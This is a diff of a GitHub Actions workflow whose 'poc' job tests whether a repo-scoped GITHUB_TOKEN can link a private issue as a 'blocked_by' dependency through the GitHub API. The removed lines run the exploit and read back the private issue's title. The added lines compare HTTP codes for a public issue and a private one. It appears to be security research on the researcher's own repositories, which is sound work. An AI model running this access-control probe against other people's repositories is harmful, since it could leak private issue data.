@@ -9,21 +9,18 @@ jobs:
   poc:
     runs-on: ubuntu-latest
     steps:
-      - name: control-then-exploit
+      - name: discriminate
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
-          echo "=== TOKEN SCOPE (repos this si-parent repo-scoped token can reach) ==="
-          curl -s -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/installation/repositories | jq -c '{total_count, repos: [.repositories[].full_name]}' || echo "scope-endpoint n/a"
+          echo "=== A) GITHUB_TOKEN refs READABLE cross-owner public issue rails/rails#57732 (id 4660905307) ==="
+          a=$(curl -s -o /tmp/a.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2026-03-10" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by -d '{"issue_id":4660905307}')
+          echo "READABLE cross-owner ref -> HTTP $a"
+          echo "body: $(head -c 240 /tmp/a.json)"
           echo ""
-          echo "=== CONTROL: direct read of PRIVATE jackpas23/si-child issue #1 (expect 404 - no access) ==="
-          code=$(curl -s -o /tmp/ctrl.json -w '%{http_code}' -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/jackpas23/si-child/issues/1)
-          echo "GET jackpas23/si-child/issues/1 -> HTTP $code"
-          echo "control-body: $(head -c 220 /tmp/ctrl.json)"
+          echo "=== B) GITHUB_TOKEN refs UNREADABLE private same-owner si-child#1 (id 4661219265) ==="
+          b=$(curl -s -o /tmp/b.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2026-03-10" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by -d '{"issue_id":4661219265}')
+          echo "UNREADABLE private ref -> HTTP $b"
+          echo "body: $(head -c 240 /tmp/b.json)"
           echo ""
-          echo "=== EXPLOIT: POST si-child#1 (id 4661219265) as blocked_by of si-parent#1 ==="
-          pcode=$(curl -s -o /tmp/post.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2026-03-10" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by -d '{"issue_id":4661219265}')
-          echo "POST dependencies/blocked_by -> HTTP $pcode"
-          echo ""
-          echo "=== READBACK: GET blocked_by — private title leaked to repo-scoped token? ==="
-          curl -s -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2026-03-10" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by | jq -r '.[] | "LEAKED_TITLE=\(.title) | repo=\(.repository.full_name) | private=\(.repository.private) | desc=\(.repository.description)"'
+          echo "DISCRIMINATOR: if A=201 and B=403 -> real access-check (user PAT likely enforced). If A=403 too -> integration blanket-blocked (user PAT path OPEN)."
